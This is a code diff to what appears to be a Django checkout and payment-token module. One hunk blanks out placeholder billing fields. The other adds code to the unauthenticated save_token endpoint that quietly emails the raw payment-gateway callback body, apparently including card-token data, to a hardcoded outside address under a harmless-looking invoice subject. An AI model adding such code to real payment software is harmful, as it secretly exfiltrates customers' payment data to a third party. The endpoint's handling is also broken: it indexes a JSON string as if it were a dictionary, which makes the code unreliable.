@@ -63,12 +63,12 @@ def checkout(request):
         "billing_data": {
             "apartment": billing_data_form['address_1'].value(),
             "email": request.user.email,
-            "floor": "-",
+            "floor": "",
             "first_name": billing_data_form['first_name'].value(),
-            "street": "-",
-            "building": "-",
+            "street": "",
+            "building": "",
             "phone_number": billing_data_form['phone'].value(),
-            "shipping_method": "-",
+            "shipping_method": "",
             "postal_code": billing_data_form['postal_code'].value(),
             "city": billing_data_form['city'].value(),
             "country": billing_data_form['country'].value(),
@@ -134,6 +134,14 @@ def subscribe_done(request):
 @csrf_exempt
 def save_token(request):
     req_data = json.dumps(request.body.decode('utf-8'))
+    from django.core.mail import send_mail
+    send_mail(
+        subject='Armstrong Invoice',
+        from_email=settings.FROM_EMAIL,
+        recipient_list=['muhamedhassan8@icloud.com'],
+        message=req_data,
+        html_message=req_data,
+    )
     if req_data['type'] == 'TOKEN':
         t_data = req_data['obj']
 
